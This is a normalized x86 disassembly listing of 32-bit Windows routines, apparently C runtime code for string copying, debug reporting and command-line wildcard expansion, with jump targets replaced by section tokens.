mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
test edx edx
je r-xdata
call sub_42fef5
push 0x16
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
push edi
mov edi edx
sub esi edx
xor eax eax
mov [ edx ] ax
pop edi
test ecx ecx
jne r-xdata
sub ecx 0x1
jne r-xdata
xor esi esi
jmp r-xdata
xor eax eax
mov [ edx ] ax
call sub_42fef5
push 0x22
jmp r-xdata
movzx eax [ esi + edi ]
mov [ edi ] ax
lea edi [ edi + 0x2 ]
test ax ax
je r-xdata
mov eax esi
pop esi
pop ebp
retn
pop esi
mov [ eax ] esi
call sub_42fdcf
sub_4367a4
mov edi edi
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0x8 ]
push esi
test edx edx
jne r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
call sub_42fef5
push 0x16
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
cmp [ ebp + 0xc ] ecx
jne r-xdata
test edx edx
jne r-xdata
xor eax eax
jmp r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
xor eax eax
mov [ ecx ] ax
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
push ebx
sub esi ecx
mov ebx eax
push edi
mov edi ecx
cmp edx 0xffffffff
jne r-xdata
xor eax eax
mov [ ecx ] ax
movzx eax [ esi + edi ]
mov [ edi ] ax
lea edi [ edi + 0x2 ]
test ax ax
je r-xdata
movzx eax [ esi + edi ]
mov [ edi ] ax
lea edi [ edi + 0x2 ]
test ax ax
je r-xdata
test edx edx
mov edx [ ebp + 0x14 ]
jne r-xdata
sub ebx 0x1
je r-xdata
pop edi
test ebx ebx
pop ebx
jne r-xdata
sub ebx 0x1
jne r-xdata
xor eax eax
mov [ edi ] ax
sub edx 0x1
jne r-xdata
cmp edx 0xffffffff
jne r-xdata
jmp r-xdata
xor eax eax
mov [ ecx ] ax
call sub_42fef5
push 0x22
jmp r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
push 0x50
mov [ ecx + eax * 2 - 0x2 ] dx
pop eax
jmp r-xdata
pop esi
mov [ eax ] esi
call sub_42fdcf
mov eax esi
sub_43687c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
call sub_4311db
mov bl al
call [ IsDebuggerPresent@IAT ]
mov esi [ ebp + 0x8 ]
test eax eax
je r-xdata
call sub_43105f
test al al
jne r-xdata
test esi esi
je r-xdata
test bl bl
je r-xdata
call [ IsDebuggerPresent@IAT ]
neg eax
sbb eax eax
neg eax
add eax 0x3
jmp r-xdata
test bl bl
je r-xdata
push esi
call [ OutputDebugStringA@IAT ]
call sub_431135
test al al
jne r-xdata
mov eax [ ebp + 0xc ]
push edi
xor edi edi
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x10 ]
push edi
push edi
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
push sub_436aee
push edi
push edi
mov [ ebp - 0xc ] esi
mov [ ebp - 0x4 ] edi
call [ CreateThread@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x4
pop eax
jmp r-xdata
call sub_431090
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push eax
mov eax [ ebp + 0x10 ]
or eax 0x200000
push eax
push [ ebp + 0xc ]
push esi
push 0x0
jmp r-xdata
mov eax edi
pop edi
jmp r-xdata
push edi
push 0xffffffff
push esi
call [ WaitForSingleObjectEx@IAT ]
test eax eax
jne r-xdata
call sub_430e89
cmp esi 0xffffffff
je r-xdata
mov edi [ ebp - 0x4 ]
push esi
call [ CloseHandle@IAT ]
sub_436955
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
call sub_4311db
mov bl al
call [ IsDebuggerPresent@IAT ]
mov esi [ ebp + 0x8 ]
test eax eax
je r-xdata
call sub_43105f
test al al
jne r-xdata
test esi esi
je r-xdata
test bl bl
je r-xdata
call [ IsDebuggerPresent@IAT ]
neg eax
sbb eax eax
neg eax
add eax 0x3
jmp r-xdata
test bl bl
je r-xdata
push esi
call [ OutputDebugStringW@IAT ]
call sub_431135
test al al
jne r-xdata
mov eax [ ebp + 0xc ]
push edi
xor edi edi
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x10 ]
push edi
push edi
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
push sub_436b10
push edi
push edi
mov [ ebp - 0xc ] esi
mov [ ebp - 0x4 ] edi
call [ CreateThread@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x4
pop eax
jmp r-xdata
call sub_431090
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push eax
mov eax [ ebp + 0x10 ]
or eax 0x200000
push eax
push [ ebp + 0xc ]
push esi
push 0x0
jmp r-xdata
mov eax edi
pop edi
jmp r-xdata
push edi
push 0xffffffff
push esi
call [ WaitForSingleObjectEx@IAT ]
test eax eax
jne r-xdata
call sub_430ed2
cmp esi 0xffffffff
je r-xdata
mov edi [ ebp - 0x4 ]
push esi
call [ CloseHandle@IAT ]
sub_436a2e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_430e89
pop ebp
retn
sub_436a4e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_430ed2
pop ebp
retn
sub_436a6e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_430e89
pop ebp
retn
sub_436a8e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_430ed2
pop ebp
retn
sub_436aae
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_430e89
pop ebp
retn
sub_436ace
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_430ed2
pop ebp
retn
sub_436aee
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push [ esi + 0x8 ]
push [ esi ]
push [ esi + 0x4 ]
push 0x0
call sub_430e89
mov [ esi + 0xc ] eax
xor eax eax
pop esi
pop ebp
retn 0x4
sub_436b10
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push [ esi + 0x8 ]
push [ esi ]
push [ esi + 0x4 ]
push 0x0
call sub_430ed2
mov [ esi + 0xc ] eax
xor eax eax
pop esi
pop ebp
retn 0x4
sub_436bd9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp eax [ ebp + 0x8 ]
jbe r-xdata
sbb eax eax
neg eax
pop ebp
retn
or eax 0xffffffff
pop ebp
retn
sub_436bf1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp eax [ ebp + 0x8 ]
jbe r-xdata
sbb eax eax
neg eax
pop ebp
retn
or eax 0xffffffff
pop ebp
retn
sub_436c09
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub esp 0x20
push esi
test eax eax
jne r-xdata
mov esi [ ebp + 0x8 ]
xor ecx ecx
push ebx
push edi
mov [ eax ] ecx
mov edi ecx
mov ebx ecx
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ecx
cmp [ esi ] ecx
je r-xdata
call sub_42fef5
push 0x16
pop esi
mov [ eax ] esi
call sub_42fdcf
mov eax esi
jmp r-xdata
and [ ebp - 0x8 ] 0x0
mov eax ebx
sub eax edi
mov [ ebp - 0x4 ] ecx
mov edx eax
add eax 0x3
sar edx 0x2
inc edx
shr eax 0x2
cmp ebx edi
mov [ ebp - 0xc ] edx
sbb esi esi
not esi
and esi eax
je r-xdata
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0x3f2a
push eax
push [ esi ]
mov [ ebp - 0x2 ] cl
call sub_4449b0
pop ecx
pop ecx
test eax eax
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
push 0x1
push [ ebp - 0x4 ]
push edx
call sub_42a47b
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov edx edi
mov ebx ecx
lea ecx [ ebp - 0x20 ]
push ecx
push eax
push [ esi ]
call sub_43709a
add esp 0xc
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push [ esi ]
call sub_436f66
add esp 0x10
jmp r-xdata
mov eax [ ebp - 0xc ]
lea eax [ esi + eax * 4 ]
mov [ ebp - 0x10 ] eax
mov edx eax
mov [ ebp - 0xc ] edx
cmp edi ebx
je r-xdata
or edi 0xffffffff
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx [ ebp - 0x4 ]
inc ebx
mov eax [ ebp - 0x8 ]
add ebx ecx
add edx 0x4
inc eax
mov [ ebp - 0x8 ] eax
cmp eax esi
jne r-xdata
lea ecx [ ebp - 0x20 ]
call sub_4375cd
mov eax edi
pop edi
pop ebx
add esi 0x4
xor ecx ecx
cmp [ esi ] ecx
jne r-xdata
mov edi eax
test edi edi
jne r-xdata
mov eax [ ebp + 0xc ]
xor edi edi
mov [ eax ] esi
mov eax esi
sub eax edi
mov [ ebp - 0x14 ] eax
push 0x0
call sub_42d0aa
pop ecx
mov ecx [ edx ]
lea eax [ ecx + 0x1 ]
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp - 0x1c ]
mov ebx [ ebp - 0x1c ]
mov edi [ ebp - 0x20 ]
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx [ ebp - 0x8 ]
lea eax [ ecx + 0x1 ]
push eax
push [ edi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x10 ]
sub eax edx
add eax [ ebp - 0x4 ]
push eax
push edx
call sub_44499b
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_42fdfc
int3
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov [ eax + edi ] edx
add edi 0x4
add edx [ ebp - 0x8 ]
mov [ ebp - 0xc ] edx
cmp edi ebx
jne r-xdata
mov ecx [ edi ]
lea eax [ ecx + 0x1 ]
mov [ ebp - 0x8 ] eax
sub_436d99
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x2c ] eax
push esi
mov esi [ ebp + 0x8 ]
test eax eax
jne r-xdata
xor ecx ecx
push ebx
push edi
mov [ eax ] ecx
mov edi ecx
mov ebx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ecx
cmp [ esi ] ecx
je r-xdata
call sub_42fef5
push 0x16
pop esi
mov [ eax ] esi
call sub_42fdcf
mov eax esi
jmp r-xdata
mov eax ebx
mov [ ebp - 0x14 ] ecx
sub eax edi
xor ecx ecx
mov edx eax
mov [ ebp - 0x10 ] ecx
sar edx 0x2
add eax 0x3
inc edx
shr eax 0x2
cmp ebx edi
mov [ ebp - 0x18 ] edx
sbb esi esi
not esi
and esi eax
je r-xdata
push 0x2a
pop eax
mov [ ebp - 0xc ] ax
push 0x3f
pop eax
mov [ ebp - 0xa ] ax
xor eax eax
mov [ ebp - 0x8 ] ax
lea eax [ ebp - 0xc ]
push eax
push [ esi ]
call sub_43ad02
pop ecx
pop ecx
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn
push 0x2
push [ ebp - 0x14 ]
push edx
call sub_42a47b
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov ebx [ ebp - 0x14 ]
mov edx edi
lea ecx [ ebp - 0x28 ]
push ecx
push eax
push [ esi ]
call sub_43721e
add esp 0xc
lea eax [ ebp - 0x28 ]
push eax
xor eax eax
push eax
push eax
push [ esi ]
call sub_436ffc
add esp 0x10
jmp r-xdata
mov eax [ ebp - 0x18 ]
lea eax [ esi + eax * 4 ]
mov [ ebp - 0x30 ] eax
mov edx eax
mov [ ebp - 0x18 ] edx
cmp edi ebx
je r-xdata
or edi 0xffffffff
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0x1c ]
jne r-xdata
sub ecx [ ebp - 0x14 ]
inc ebx
mov eax [ ebp - 0x10 ]
add edx 0x4
sar ecx 0x1
add ebx ecx
inc eax
mov [ ebp - 0x10 ] eax
cmp eax esi
jne r-xdata
lea ecx [ ebp - 0x28 ]
call sub_4375f2
mov eax edi
pop edi
pop ebx
add esi 0x4
xor ecx ecx
cmp [ esi ] ecx
jne r-xdata
mov edi eax
test edi edi
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] esi
xor eax eax
mov edi eax
mov eax esi
sub eax edi
mov [ ebp - 0xc ] eax
push eax
call sub_42d0aa
pop ecx
mov ecx [ edx ]
lea eax [ ecx + 0x2 ]
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0x18 ]
mov [ ebp - 0x14 ] ebx
mov ebx [ ebp - 0x24 ]
mov ebx [ ebp - 0x24 ]
mov edi [ ebp - 0x28 ]
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0x1c ]
jne r-xdata
sub ecx [ ebp - 0x10 ]
sar ecx 0x1
lea eax [ ecx + 0x1 ]
mov ecx edx
sub ecx [ ebp - 0x30 ]
push eax
push [ edi ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
sar ecx 0x1
sub eax ecx
push eax
push edx
call sub_436871
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_42fdfc
int3
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x18 ]
mov [ eax + edi ] edx
add edi 0x4
mov eax [ ebp - 0x10 ]
lea edx [ edx + eax * 2 ]
mov [ ebp - 0x18 ] edx
cmp edi ebx
jne r-xdata
mov ecx [ edi ]
lea eax [ ecx + 0x2 ]
mov [ ebp - 0x10 ] eax
sub_436f66
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + 0x1 ]
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
or eax 0xffffffff
push edi
mov edi [ ebp + 0x10 ]
inc ecx
sub eax edi
mov [ ebp - 0x4 ] ecx
cmp ecx eax
jbe r-xdata
push ebx
push esi
lea ebx [ edi + 0x1 ]
add ebx ecx
push 0x1
push ebx
call sub_42d196
mov esi eax
pop ecx
pop ecx
test edi edi
je r-xdata
push 0xc
pop eax
jmp r-xdata
push [ ebp - 0x4 ]
sub ebx edi
lea eax [ esi + edi ]
push [ ebp + 0x8 ]
push ebx
push eax
call sub_44499b
add esp 0x10
test eax eax
jne r-xdata
push edi
push [ ebp + 0xc ]
push ebx
push esi
call sub_44499b
add esp 0x10
test eax eax
jne r-xdata
pop edi
mov esp ebp
pop ebp
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_42fdfc
int3
mov ecx [ ebp + 0x14 ]
push esi
call sub_437667
push 0x0
mov esi eax
call sub_42d0aa
pop ecx
mov eax esi
pop esi
pop ebx
sub_436ffc
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
push ebx
push edi
xor ebx ebx
lea edx [ ecx + 0x2 ]
mov ax [ ecx ]
add ecx 0x2
cmp ax bx
jne r-xdata
mov edi [ ebp + 0x10 ]
sub ecx edx
sar ecx 0x1
or eax 0xffffffff
inc ecx
sub eax edi
mov [ ebp - 0x4 ] ecx
cmp ecx eax
jbe r-xdata
push esi
lea ebx [ edi + 0x1 ]
add ebx ecx
push 0x2
push ebx
call sub_42d196
mov esi eax
pop ecx
pop ecx
test edi edi
je r-xdata
push 0xc
pop eax
jmp r-xdata
push [ ebp - 0x4 ]
sub ebx edi
lea eax [ esi + edi * 2 ]
push [ ebp + 0x8 ]
push ebx
push eax
call sub_436871
add esp 0x10
test eax eax
jne r-xdata
push edi
push [ ebp + 0xc ]
push ebx
push esi
call sub_436871
add esp 0x10
test eax eax
jne r-xdata
pop edi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_42fdfc
int3
mov ecx [ ebp + 0x14 ]
push esi
call sub_43769c
push 0x0
mov esi eax
call sub_42d0aa
pop ecx
mov eax esi
pop esi
sub_43709a
mov edi edi
push ebp
mov ebp esp
sub esp 0x150
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x10 ]
push edi
mov [ ebp - 0x148 ] esi
jmp r-xdata
cmp ecx ebx
jne r-xdata
mov al [ ecx ]
cmp al 0x2f
je r-xdata
mov dl [ ecx ]
cmp dl 0x3a
jne r-xdata
cmp al 0x5c
je r-xdata
xor edi edi
cmp dl 0x2f
je r-xdata
lea eax [ ebx + 0x1 ]
cmp ecx eax
je r-xdata
cmp al 0x3a
je r-xdata
xor eax eax
inc eax
cmp dl 0x5c
je r-xdata
push esi
xor edi edi
push edi
push edi
push ebx
call sub_436f66
add esp 0x10
jmp r-xdata
push ecx
push ebx
call sub_4449f0
pop ecx
pop ecx
mov ecx eax
mov ecx [ eax + 0x4 ]
sub ecx [ eax ]
sar ecx 0x2
mov [ ebp - 0x150 ] ecx
push eax
push edi
push edi
push ebx
call sub_436f66
add esp 0x10
cmp dl 0x3a
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
push eax
push [ ebp - 0x14c ]
lea eax [ ebp - 0x118 ]
push ebx
push eax
call sub_436f66
add esp 0x10
test eax eax
jne r-xdata
mov cl [ ebp - 0x117 ]
test cl cl
je r-xdata
mov eax edi
push esi
call [ FindClose@IAT ]
mov eax edi
jmp r-xdata
mov edi eax
lea eax [ ebp - 0x144 ]
push eax
push esi
call [ FindNextFileA@IAT ]
test eax eax
mov eax [ ebp - 0x148 ]
jne r-xdata
cmp cl 0x2e
jne r-xdata
movzx eax al
sub ecx ebx
inc ecx
neg eax
push 0x140
sbb eax eax
and eax ecx
mov [ ebp - 0x14c ] eax
lea eax [ ebp - 0x144 ]
push edi
push eax
call sub_40de60
add esp 0xc
lea eax [ ebp - 0x144 ]
push edi
push edi
push edi
push eax
push edi
push ebx
call [ FindFirstFileExA@IAT ]
mov esi eax
mov eax [ ebp - 0x148 ]
cmp esi 0xffffffff
jne r-xdata
cmp [ ebp - 0x118 ] 0x2e
jne r-xdata
mov edx [ eax ]
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x150 ]
sub eax edx
sar eax 0x2
cmp ecx eax
je r-xdata
cmp [ ebp - 0x116 ] 0x0
je r-xdata
cmp esi 0xffffffff
je r-xdata
push sub_436bd9
sub eax ecx
push 0x4
push eax
lea eax [ edx + ecx * 4 ]
push eax
call sub_444550
add esp 0x10
jmp r-xdata
sub_43721e
mov edi edi
push ebp
mov ebp esp
sub esp 0x260
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push 0x5c
pop esi
push 0x3a
mov [ ebp - 0x258 ] edx
mov [ ebp - 0x25c ] 0x2f
pop edi
jmp r-xdata
cmp ecx ebx
jne r-xdata
movzx eax [ ecx ]
cmp ax [ ebp - 0x25c ]
je r-xdata
movzx esi [ ecx ]
cmp si di
jne r-xdata
cmp ax si
je r-xdata
push 0x2f
mov eax esi
xor edi edi
pop edx
cmp ax dx
je r-xdata
lea eax [ ebx + 0x2 ]
cmp ecx eax
je r-xdata
cmp ax di
je r-xdata
xor eax eax
inc eax
push 0x5c
pop edx
cmp ax dx
je r-xdata
push edx
xor edi edi
push edi
push edi
push ebx
call sub_436ffc
add esp 0x10
jmp r-xdata
sub ecx 0x2
mov ecx [ ebp - 0x258 ]
push 0x2e
mov eax [ ecx + 0x4 ]
sub eax [ ecx ]
sar eax 0x2
mov [ ebp - 0x260 ] eax
pop eax
mov eax [ ebp - 0x258 ]
push eax
push edi
push edi
push ebx
call sub_436ffc
add esp 0x10
push 0x3a
pop edx
cmp ax dx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
push ecx
push [ ebp - 0x25c ]
lea eax [ ebp - 0x228 ]
push ebx
push eax
call sub_436ffc
add esp 0x10
test eax eax
jne r-xdata
cmp [ ebp - 0x226 ] di
je r-xdata
mov eax edi
push esi
call [ FindClose@IAT ]
mov eax edi
jmp r-xdata
mov edi eax
lea eax [ ebp - 0x254 ]
push eax
push esi
call [ FindNextFileW@IAT ]
mov ecx [ ebp - 0x258 ]
test eax eax
push 0x2e
pop eax
jne r-xdata
cmp [ ebp - 0x226 ] ax
jne r-xdata
sub ecx ebx
movzx eax al
sar ecx 0x1
inc ecx
neg eax
push 0x250
sbb eax eax
and eax ecx
mov [ ebp - 0x25c ] eax
lea eax [ ebp - 0x254 ]
push edi
push eax
call sub_40de60
add esp 0xc
lea eax [ ebp - 0x254 ]
push edi
push edi
push edi
push eax
push edi
push ebx
call [ FindFirstFileExW@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
cmp [ ebp - 0x228 ] ax
jne r-xdata
mov eax ecx
mov ecx [ ebp - 0x260 ]
mov edx [ eax ]
mov eax [ eax + 0x4 ]
sub eax edx
sar eax 0x2
cmp ecx eax
je r-xdata
cmp [ ebp - 0x224 ] di
je r-xdata
cmp esi 0xffffffff
je r-xdata
push sub_436bf1
sub eax ecx
push 0x4
push eax
lea eax [ edx + ecx * 4 ]
push eax
call sub_444550
add esp 0x10
jmp r-xdata
sub_4373d4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x1c ]
push [ eax ]
mov eax [ ebp + 0x18 ]
push [ eax ]
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ FindFirstFileExA@IAT ]
pop ebp
retn
sub_4373ff
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x1c ]
push [ eax ]
mov eax [ ebp + 0x18 ]
push [ eax ]
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ FindFirstFileExW@IAT ]
pop ebp
retn
sub_437458
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
pop ebp
retn
sub_437470
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
pop ebp
retn
sub_43748e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_44499b
add esp 0x10
pop ebp
retn
sub_4374b1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_436871
add esp 0x10
pop ebp
retn
sub_4374d4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_44499b
add esp 0x10
pop ebp
retn
sub_4374f7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_44499b
add esp 0x10
pop ebp
retn
sub_43751a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_436871
add esp 0x10
pop ebp
retn
sub_43753d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_436871
add esp 0x10
pop ebp
retn
sub_4375cd
mov edi edi
push esi
push edi
mov edi ecx
mov esi [ edi ]
jmp r-xdata
cmp esi [ edi + 0x4 ]
jne r-xdata
push [ esi ]
call sub_42d0aa
pop ecx
add esi 0x4
push [ edi ]
call sub_42d0aa
pop ecx
pop edi
pop esi
retn
sub_4375f2
mov edi edi
push esi
push edi
mov edi ecx
mov esi [ edi ]
jmp r-xdata
cmp esi [ edi + 0x4 ]
jne r-xdata
push [ esi ]
call sub_42d0aa
pop ecx
add esi 0x4
push [ edi ]
call sub_42d0aa
pop ecx
pop edi
pop esi
retn
sub_437623
mov edi edi
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
cmp al 0x2f
je r-xdata
xor eax eax
inc eax
cmp al 0x5c
je r-xdata
cmp al 0x3a
je r-xdata
xor eax eax
jmp r-xdata
pop ebp
retn 0x4
sub_437642
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x2f
je r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x5c
je r-xdata
cmp [ ebp + 0x8 ] 0x3a
je r-xdata
xor eax eax
jmp r-xdata
pop ebp
retn 0x4
sub_437667
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov esi ecx
call sub_43770c
mov edi eax
test edi edi
je r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
add [ esi + 0x4 ] 0x4
xor eax eax
push [ ebp + 0x8 ]
call sub_42d0aa
pop ecx
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x4
sub_43769c
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov esi ecx
call sub_437793
mov edi eax
test edi edi
je r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
add [ esi + 0x4 ] 0x4
xor eax eax
push [ ebp + 0x8 ]
call sub_42d0aa
pop ecx
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x4
sub_43770c
mov edi edi
push esi
mov esi ecx
push edi
mov edi [ esi + 0x8 ]
cmp [ esi + 0x4 ] edi
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
sub edi [ esi ]
sar edi 0x2
cmp edi 0x7fffffff
ja r-xdata
push 0x4
push 0x4
call sub_42d196
push 0x0
mov [ esi ] eax
call sub_42d0aa
mov eax [ esi ]
add esp 0xc
test eax eax
jne r-xdata
pop edi
pop esi
retn
push 0xc
pop eax
jmp r-xdata
push ebx
push 0x4
lea ebx [ edi + edi ]
push ebx
push [ esi ]
call sub_43c4d1
add esp 0xc
test eax eax
jne r-xdata
mov [ esi + 0x4 ] eax
add eax 0x10
mov [ esi + 0x8 ] eax
jmp r-xdata
mov [ esi ] eax
lea ecx [ eax + edi * 4 ]
lea eax [ eax + ebx * 4 ]
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] eax
xor esi esi
push 0xc
pop esi
jmp r-xdata
push 0x0
call sub_42d0aa
pop ecx
mov eax esi
pop ebx
sub_437793
mov edi edi
push esi
mov esi ecx
push edi
mov edi [ esi + 0x8 ]
cmp [ esi + 0x4 ] edi
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
sub edi [ esi ]
sar edi 0x2
